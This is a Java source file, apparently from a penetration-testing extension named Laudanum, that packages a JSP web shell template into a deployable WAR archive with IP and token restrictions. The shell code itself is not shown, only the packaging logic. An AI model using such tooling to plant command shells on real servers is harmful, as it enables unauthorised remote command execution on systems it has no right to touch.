package com.professionallyevil.co2.laudanum;

import javax.swing.*;
import java.awt.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;


public class WARShellPayloadType extends PayloadType {
    @Override
    public void savePayload(Component parentComponent, String acceptIPs, String acceptToken) throws Exception {
        String filename = JOptionPane.showInputDialog(parentComponent, "What do you want to call the jsp file?", "shell.jsp");

        if(filename != null){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            processTemplate(bos, renderList(acceptIPs.split(","), ",", "\""),acceptToken);
            File warfile = chooseFile(parentComponent, "laudanum.war", "Choose war filename");
            if(warfile!=null){
                FileOutputStream fos = new FileOutputStream(warfile);
                JarOutputStream jos = new JarOutputStream(fos);
                jos.putNextEntry(new JarEntry("/WEB-INF/web.xml"));
                jos.write("<?xml version=\"1.0\" ?>\n".getBytes());
                jos.write(("<web-app xmlns=\"http://java.sun.com/xml/ns/j2ee\" " +
                        "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
                        "xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee " +
                        "http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\" " +
                        "version=\"2.4\">\n").getBytes());
                jos.write("  <servlet>\n".getBytes());
                jos.write("    <servlet-name>Command</servlet-name>\n".getBytes());
                jos.write(("    <jsp-file>/" + filename + "</jsp-file>\n").getBytes());
                jos.write("  </servlet>\n</web-app>".getBytes());
                jos.closeEntry();
                jos.putNextEntry(new JarEntry(filename));

                ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());

                byte[] buffer = new byte[128];
                int length;
                while((length = bis.read(buffer)) > 0) {
                    jos.write(buffer, 0, length);
                }
                jos.closeEntry();
                jos.flush();
                jos.close();
                fos.flush();
                fos.close();
            }
        }
    }

    @Override
    String getTemplate() {
        return "com/professionallyevil/co2/laudanum/java/shell.jsp";
    }
}
